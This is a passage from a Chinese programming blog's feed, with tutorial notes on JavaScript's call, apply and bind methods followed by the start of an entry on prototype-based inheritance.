<p>上面代码中，全局环境运行函数<code>f</code>时，<code>this</code>指向全局环境（浏览器为<code>window</code>对象）；<code>call</code>方法可以改变<code>this</code>的指向，指定<code>this</code>指向对象<code>obj</code>，然后在对象<code>obj</code>的作用域中运行函数<code>f</code>。<br><code>call</code>方法的参数，应该是一个对象。如果参数为空、<code>null</code>和<code>undefined</code>，则默认传入全局对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">n</span>: <span class="number">456</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.call() <span class="comment">// 123</span></span><br><span class="line">a.call(<span class="literal">null</span>) <span class="comment">// 123</span></span><br><span class="line">a.call(<span class="literal">undefined</span>) <span class="comment">// 123</span></span><br><span class="line">a.call(<span class="built_in">window</span>) <span class="comment">// 123</span></span><br><span class="line">a.call(obj) <span class="comment">// 456</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>a</code>函数中的<code>this</code>关键字，如果指向全局对象，返回结果为<code>123</code>。如果使用<code>call</code>方法将<code>this</code>关键字指向<code>obj</code>对象，返回结果为<code>456</code>。可以看到，如果<code>call</code>方法没有参数，或者参数为<code>null</code>或<code>undefined</code>，则等同于指向全局对象。<br>如果<code>call</code>方法的参数是一个原始值，那么这个原始值会自动转成对应的包装对象，然后传入<code>call</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">f.call(<span class="number">5</span>)</span><br><span class="line"><span class="comment">// Number &#123;[[PrimitiveValue]]: 5&#125;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>call</code>的参数为<code>5</code>，不是对象，会被自动转成包装对象（<code>Number</code>的实例），绑<code>定f</code>内部的<code>this</code>。<br><code>call</code>方法还可以接受多个参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">func.call(thisValue, arg1, arg2, ...)</span><br></pre></td></tr></table></figure>
<p><code>call</code>的第一个参数就是<code>this</code>所要指向的那个对象，后面的参数则是函数调用时所需的参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add.call(<span class="built_in">this</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>call</code>方法指定函数<code>add</code>内部的<code>this</code>绑定当前环境（对象），并且参数为<code>1</code>和<code>2</code>，因此函数<code>add</code>运行后得到<code>3</code>。<br><code>call</code>方法的一个应用是调用对象的原生方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.hasOwnProperty(<span class="string">&#x27;toString&#x27;</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 覆盖掉继承的 hasOwnProperty 方法</span></span><br><span class="line">obj.hasOwnProperty = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">obj.hasOwnProperty(<span class="string">&#x27;toString&#x27;</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.prototype.hasOwnProperty.call(obj, <span class="string">&#x27;toString&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>hasOwnProperty</code>是<code>obj</code>对象继承的方法，如果这个方法一旦被覆盖，就不会得到正确结果。<code>call</code>方法可以解决这个问题，它将<code>hasOwnProperty</code>方法的原始定义放到<code>obj</code>对象上执行，这样无论<code>obj</code>上有没有同名方法，都不会影响结果。</p>
<h5 id="2-5-2-Function-prototype-apply"><a href="#2-5-2-Function-prototype-apply" class="headerlink" title="2.5.2 Function.prototype.apply()"></a>2.5.2 Function.prototype.apply()</h5><p><code>apply</code>方法的作用与<code>call</code>方法类似，也是改变<code>this</code>指向，然后再调用该函数。唯一的区别就是，它接收一个数组作为函数执行时的参数，使用格式如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">func.apply(thisValue, [arg1, arg2, ...])</span><br></pre></td></tr></table></figure>
<p><code>apply</code>方法的第一个参数也是<code>this</code>所要指向的那个对象，如果设为<code>null</code>或<code>undefined</code>，则等同于指定全局对象。第二个参数则是一个数组，该数组的所有成员依次作为参数，传入原函数。原函数的参数，在<code>call</code>方法中必须一个个添加，但是在<code>apply</code>方法中，必须以数组形式添加。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x + y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f.call(<span class="literal">null</span>, <span class="number">1</span>, <span class="number">1</span>) <span class="comment">// 2</span></span><br><span class="line">f.apply(<span class="literal">null</span>, [<span class="number">1</span>, <span class="number">1</span>]) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>f</code>函数本来接受两个参数，使用<code>apply</code>方法以后，就变成可以接受一个数组作为参数。<br>利用这一点，可以做一些有趣的应用。</p>
<h6 id="1-找出数组最大元素"><a href="#1-找出数组最大元素" class="headerlink" title="(1)找出数组最大元素"></a>(1)找出数组最大元素</h6><p>JavaScript 不提供找出数组最大元素的函数。结合使用<code>apply</code>方法和<code>Math.max</code>方法，就可以返回数组的最大元素。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">10</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">9</span>];</span><br><span class="line"><span class="built_in">Math</span>.max.apply(<span class="literal">null</span>, a) <span class="comment">// 15</span></span><br></pre></td></tr></table></figure>
<h6 id="2-将数组的空元素变为undefined"><a href="#2-将数组的空元素变为undefined" class="headerlink" title="(2)将数组的空元素变为undefined"></a>(2)将数组的空元素变为<code>undefined</code></h6><p>通过<code>apply</code>方法，利用<code>Array</code>构造函数将数组的空元素变成<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.apply(<span class="literal">null</span>, [<span class="string">&#x27;a&#x27;</span>, ,<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="comment">// [ &#x27;a&#x27;, undefined, &#x27;b&#x27; ]</span></span><br></pre></td></tr></table></figure>
<p>空元素与<code>undefined</code>的差别在于，数组的<code>forEach</code>方法会跳过空元素，但是不会跳过<code>undefined</code>。因此，遍历内部元素的时候，会得到不同的结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;a&#x27;</span>, , <span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.forEach(print)</span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// b</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.apply(<span class="literal">null</span>, a).forEach(print)</span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// b</span></span><br></pre></td></tr></table></figure>
<h6 id="3-转换类似数组的对象"><a href="#3-转换类似数组的对象" class="headerlink" title="(3)转换类似数组的对象"></a>(3)转换类似数组的对象</h6><p>另外，利用数组对象的<code>slice</code>方法，可以将一个类似数组的对象（比如<code>arguments</code>对象）转为真正的数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.slice.apply(&#123;<span class="number">0</span>: <span class="number">1</span>, <span class="attr">length</span>: <span class="number">1</span>&#125;) <span class="comment">// [1]</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.slice.apply(&#123;<span class="number">0</span>: <span class="number">1</span>&#125;) <span class="comment">// []</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.slice.apply(&#123;<span class="number">0</span>: <span class="number">1</span>, <span class="attr">length</span>: <span class="number">2</span>&#125;) <span class="comment">// [1, undefined]</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.slice.apply(&#123;<span class="attr">length</span>: <span class="number">1</span>&#125;) <span class="comment">// [undefined]</span></span><br></pre></td></tr></table></figure>
<p>上面代码的<code>apply</code>方法的参数都是对象，但是返回结果都是数组，这就起到了将对象转成数组的目的。从上面代码可以看到，这个方法起作用的前提是，被处理的对象必须有<code>length</code>属性，以及相对应的数字键。</p>
<h6 id="4-绑定回调函数的对象"><a href="#4-绑定回调函数的对象" class="headerlink" title="(4)绑定回调函数的对象"></a>(4)绑定回调函数的对象</h6><p>前面的按钮点击事件的例子，可以改写如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"></span><br><span class="line">o.f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span> === o);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">  o.f.apply(o);</span><br><span class="line">  <span class="comment">// 或者 o.f.call(o);</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery 的写法</span></span><br><span class="line">$(<span class="string">&#x27;#button&#x27;</span>).on(<span class="string">&#x27;click&#x27;</span>, f);</span><br></pre></td></tr></table></figure>
<p>上面代码中，点击按钮以后，控制台将会显示<code>true</code>。由于<code>apply()</code>方法（或者<code>call()</code>方法）不仅绑定函数执行时所在的对象，还会立即执行函数，因此不得不把绑定语句写在一个函数体内。更简洁的写法是采用下面介绍的<code>bind()</code>方法。</p>
<h5 id="2-5-3-Function-prototype-bind"><a href="#2-5-3-Function-prototype-bind" class="headerlink" title="2.5.3 Function.prototype.bind()"></a>2.5.3 Function.prototype.bind()</h5><p><code>bind()</code>方法用于将函数体内的<code>this</code>绑定到某个对象，然后返回一个新函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">d.getTime() <span class="comment">// 1481869925657</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> print = d.getTime;</span><br><span class="line">print() <span class="comment">// Uncaught TypeError: this is not a Date object.</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，我们将<code>d.getTime()</code>方法赋给变量<code>print</code>，然后调用<code>print()</code>就报错了。这是因为<code>getTime()</code>方法内部的<code>this</code>，绑定<code>Date</code>对象的实例，赋给变量<code>print</code>以后，内部的<code>this</code>已经不指向<code>Date</code>对象的实例了。<br><code>bind()</code>方法可以解决这个问题。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> print = d.getTime.bind(d);</span><br><span class="line">print() <span class="comment">// 1481869925657</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>bind()</code>方法将<code>getTime()</code>方法内部的<code>this</code>绑定到<code>d</code>对象，这时就可以安全地将这个方法赋值给其他变量了。<br><code>bind</code>方法的参数就是所要绑定<code>this</code>的对象，下面是一个更清晰的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = &#123;</span><br><span class="line">  count: <span class="number">0</span>,</span><br><span class="line">  inc: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.count++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = counter.inc.bind(counter);</span><br><span class="line">func();</span><br><span class="line">counter.count <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>counter.inc()</code>方法被赋值给变量<code>func</code>。这时必须用<code>bind()</code>方法将<code>inc()</code>内部的<code>this</code>，绑定到<code>counter</code>，否则就会出错。<br><code>this</code>绑定到其他对象也是可以的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = &#123;</span><br><span class="line">  count: <span class="number">0</span>,</span><br><span class="line">  inc: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.count++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  count: <span class="number">100</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> func = counter.inc.bind(obj);</span><br><span class="line">func();</span><br><span class="line">obj.count <span class="comment">// 101</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>bind()</code>方法将<code>inc()</code>方法内部的<code>this</code>，绑定到<code>obj</code>对象。结果调用<code>func</code>函数以后，递增的就是<code>obj</code>内部的<code>count</code>属性。<br><code>bind()</code>还可以接受更多的参数，将这些参数绑定原函数的参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x * <span class="built_in">this</span>.m + y * <span class="built_in">this</span>.n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  m: <span class="number">2</span>,</span><br><span class="line">  n: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> newAdd = add.bind(obj, <span class="number">5</span>);</span><br><span class="line">newAdd(<span class="number">5</span>) <span class="comment">// 20</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>bind()</code>方法除了绑定<code>this</code>对象，还将<code>add()</code>函数的第一个参数<code>x</code>绑定成<code>5</code>，然后返回一个新函数<code>newAdd()</code>，这个函数只要再接受一个参数<code>y</code>就能运行了。<br>如果<code>bind()</code>方法的第一个参数是<code>null</code>或<code>undefined</code>，等于将<code>this</code>绑定到全局对象，函数运行时<code>this</code>指向顶层对象（浏览器为<code>window</code>）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> plus5 = add.bind(<span class="literal">null</span>, <span class="number">5</span>);</span><br><span class="line">plus5(<span class="number">10</span>) <span class="comment">// 15</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，函数<code>add()</code>内部并没有<code>this</code>，使用<code>bind()</code>方法的主要目的是绑定参数<code>x</code>，以后每次运行新函数<code>plus5()</code>，就只需要提供另一个参数<code>y</code>就够了。而且因为<code>add()</code>内部没有<code>this</code>，所以<code>bind()</code>的第一个参数是<code>null</code>，不过这里如果是其他对象，也没有影响。<br><code>bind()</code>方法有一些使用注意点。</p>
<h6 id="1-每一次返回一个新函数"><a href="#1-每一次返回一个新函数" class="headerlink" title="(1)每一次返回一个新函数"></a>(1)每一次返回一个新函数</h6><p><code>bind()</code>方法每运行一次，就返回一个新函数，这会产生一些问题。比如，监听事件的时候，不能写成下面这样。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">element.addEventListener(<span class="string">&#x27;click&#x27;</span>, o.m.bind(o));</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>click</code>事件绑定<code>bind()</code>方法生成的一个匿名函数。这样会导致无法取消绑定，所以下面的代码是无效的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">element.removeEventListener(<span class="string">&#x27;click&#x27;</span>, o.m.bind(o));</span><br></pre></td></tr></table></figure>
<p>正确的方法是写成下面这样：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> listener = o.m.bind(o);</span><br><span class="line">element.addEventListener(<span class="string">&#x27;click&#x27;</span>, listener);</span><br><span class="line"><span class="comment">//  ...</span></span><br><span class="line">element.removeEventListener(<span class="string">&#x27;click&#x27;</span>, listener);</span><br></pre></td></tr></table></figure>
<h6 id="2-结合回调函数使用"><a href="#2-结合回调函数使用" class="headerlink" title="(2)结合回调函数使用"></a>(2)结合回调函数使用</h6><p>回调函数是 JavaScript 最常用的模式之一，但是一个常见的错误是，将包含<code>this</code>的方法直接当作回调函数。解决方法就是使用<code>bind()</code>方法，将<code>counter.inc()</code>绑定<code>counter</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = &#123;</span><br><span class="line">  count: <span class="number">0</span>,</span><br><span class="line">  inc: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">    &#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="built_in">this</span>.count++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callIt</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">  callback();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">callIt(counter.inc.bind(counter));</span><br><span class="line">counter.count <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>callIt()</code>方法会调用回调函数。这时如果直接把<code>counter.inc</code>传入，调用时<code>counter.inc()</code>内部的<code>this</code>就会指向全局对象。使用<code>bind()</code>方法将<code>counter.inc</code>绑定<code>counter</code>以后，就不会有这个问题，<code>this</code>总是指向<code>counter</code>。<br>还有一种情况比较隐蔽，就是某些数组方法可以接受一个函数当作参数。这些函数内部的<code>this</code>指向，很可能也会出错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  times: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">  print: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.times.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.print()</span><br><span class="line"><span class="comment">// 没有任何输出</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj.print</code>内部<code>this.times</code>的<code>this</code>是指向<code>obj</code>的，这个没有问题。但是，<code>forEach()</code>方法的回调函数内部的<code>this.name</code>却是指向全局对象，导致没有办法取到值。稍微改动一下，就可以看得更清楚。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">obj.print = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.times.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span> === <span class="built_in">window</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.print()</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>解决这个问题，也是通过<code>bind()</code>方法绑定<code>this</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">obj.print = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.times.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">  &#125;.bind(<span class="built_in">this</span>));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.print()</span><br><span class="line"><span class="comment">// 张三</span></span><br><span class="line"><span class="comment">// 张三</span></span><br><span class="line"><span class="comment">// 张三</span></span><br></pre></td></tr></table></figure>
<h6 id="3-结合call-方法使用"><a href="#3-结合call-方法使用" class="headerlink" title="(3)结合call()方法使用"></a>(3)结合call()方法使用</h6><p>利用<code>bind()</code>方法，可以改写一些 JavaScript 原生方法的使用形式，以数组的<code>slice()</code>方法为例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].slice(<span class="number">0</span>, <span class="number">1</span>) <span class="comment">// [1]</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.slice.call([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="number">0</span>, <span class="number">1</span>) <span class="comment">// [1]</span></span><br></pre></td></tr></table></figure>
<p>上面的代码中，数组的<code>slice</code>方法从<code>[1, 2, 3]</code>里面，按照指定的开始位置和结束位置，切分出另一个数组。这样做的本质是在<code>[1, 2, 3]</code>上面调用<code>Array.prototype.slice()</code>方法，因此可以用<code>call</code>方法表达这个过程，得到同样的结果。<br><code>call()</code>方法实质上是调用<code>Function.prototype.call()</code>方法，因此上面的表达式可以用<code>bind()</code>方法改写。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> slice = <span class="built_in">Function</span>.prototype.call.bind(<span class="built_in">Array</span>.prototype.slice);</span><br><span class="line">slice([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="number">0</span>, <span class="number">1</span>) <span class="comment">// [1]</span></span><br></pre></td></tr></table></figure>
<p>上面代码的含义就是，将<code>Array.prototype.slice</code>变成<code>Function.prototype.call</code>方法所在的对象，调用时就变成了<code>Array.prototype.slice.call</code>。类似的写法还可以用于其他数组方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> push = <span class="built_in">Function</span>.prototype.call.bind(<span class="built_in">Array</span>.prototype.push);</span><br><span class="line"><span class="keyword">var</span> pop = <span class="built_in">Function</span>.prototype.call.bind(<span class="built_in">Array</span>.prototype.pop);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span> ,<span class="number">2</span> ,<span class="number">3</span>];</span><br><span class="line">push(a, <span class="number">4</span>)</span><br><span class="line">a <span class="comment">// [1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line">pop(a)</span><br><span class="line">a <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>
<p>如果再进一步，将<code>Function.prototype.call</code>方法绑定到<code>Function.prototype.bind</code>对象，就意味着<code>bind</code>的调用形式也可以被改写。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123; <span class="attr">v</span>: <span class="number">123</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> bind = <span class="built_in">Function</span>.prototype.call.bind(<span class="built_in">Function</span>.prototype.bind);</span><br><span class="line">bind(f, o)() <span class="comment">// 123</span></span><br></pre></td></tr></table></figure>
<p>上面代码的含义就是，将<code>Function.prototype.bind</code>方法绑定在<code>Function.prototype.call</code>上面，所以<code>bind</code>方法就可以直接使用，不需要在函数实例上使用。</p>
<p><code>Well,that&#39;s all for today</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS面向对象编程-this关键字</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0028</title>
    <url>/2021/05/19/%E6%89%93%E5%8D%A10028/</url>
    <content><![CDATA[<p><font color=#2585a6>难过的时候就抱抱自己，允许自己脆弱一会儿，收拾好心情再出发。</font></p>
<h2 id="JS面向对象编程"><a href="#JS面向对象编程" class="headerlink" title="JS面向对象编程"></a>JS面向对象编程</h2><h3 id="3-对象的继承"><a href="#3-对象的继承" class="headerlink" title="3. 对象的继承"></a>3. 对象的继承</h3><p>面向对象编程很重要的一个方面，就是对象的继承。A 对象通过继承 B 对象，就能直接拥有 B 对象的所有属性和方法。这对于代码的复用是非常有用的。</p>
<p>大部分面向对象的编程语言，都是通过“类”（class）实现对象的继承。传统上，JavaScript 语言的继承不通过 class，而是通过“原型对象”（prototype）实现，本章介绍 JavaScript 的原型链继承。</p>
<p>ES6 引入了 class 语法，基于 class 的继承不在这个教程介绍，请参阅《ES6 标准入门》一书的相关章节。</p>
<h4 id="3-1-原型对象的概述"><a href="#3-1-原型对象的概述" class="headerlink" title="3.1 原型对象的概述"></a>3.1 原型对象的概述</h4><h5 id="3-1-1-构造函数的缺点"><a href="#3-1-1-构造函数的缺点" class="headerlink" title="3.1.1 构造函数的缺点"></a>3.1.1 构造函数的缺点</h5><p>JavaScript 通过构造函数生成新对象，因此构造函数可以视为对象的模板。实例对象的属性和方法，可以定义在构造函数内部。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span> (<span class="params">name, color</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line">  <span class="built_in">this</span>.color = color;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cat1 = <span class="keyword">new</span> Cat(<span class="string">&#x27;大毛&#x27;</span>, <span class="string">&#x27;白色&#x27;</span>);</span><br><span class="line"></span><br><span class="line">cat1.name <span class="comment">// &#x27;大毛&#x27;</span></span><br><span class="line">cat1.color <span class="comment">// &#x27;白色&#x27;</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>上面代码中，<code>Cat</code>函数是一个构造函数，函数内部定义了<code>name</code>属性和<code>color</code>属性，所有实例对象（上例是<code>cat1</code>）都会生成这两个属性，即这两个属性会定义在实例对象上面。<br>通过构造函数为实例对象定义属性，虽然很方便，但是有一个缺点。同一个构造函数的多个实例之间，无法共享属性，从而造成对系统资源的浪费。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">name, color</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line">  <span class="built_in">this</span>.color = color;</span><br><span class="line">  <span class="built_in">this</span>.meow = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;喵喵&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cat1 = <span class="keyword">new</span> Cat(<span class="string">&#x27;大毛&#x27;</span>, <span class="string">&#x27;白色&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cat2 = <span class="keyword">new</span> Cat(<span class="string">&#x27;二毛&#x27;</span>, <span class="string">&#x27;黑色&#x27;</span>);</span><br><span class="line"></span><br><span class="line">cat1.meow === cat2.meow</span><br><span class="line"><span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>cat1</code>和<code>cat2</code>是同一个构造函数的两个实例，它们都具有<code>meow</code>方法。由于<code>meow</code>方法是生成在每个实例对象上面，所以两个实例就生成了两次。也就是说，每新建一个实例，就会新建一个<code>meow</code>方法。这既没有必要，又浪费系统资源，因为所有<code>meow</code>方法都是同样的行为，完全应该共享。<br>这个问题的解决方法，就是 JavaScript 的原型对象（prototype）</p>
<h5 id="3-1-2-prototype-属性的作用"><a href="#3-1-2-prototype-属性的作用" class="headerlink" title="3.1.2 prototype 属性的作用"></a>3.1.2 prototype 属性的作用</h5><p>JavaScript 继承机制的设计思想就是，原型对象的所有属性和方法，都能被实例对象共享。也就是说，如果属性和方法定义在原型上，那么所有实例对象就能共享，不仅节省了内存，还体现了实例对象之间的联系。</p>
<p>下面，先看怎么为对象指定原型。JavaScript 规定，每个函数都有一个<code>prototype</code>属性，指向一个对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">typeof</span> f.prototype <span class="comment">// &quot;object&quot;</span></span><br></pre></td></tr></table></figure>
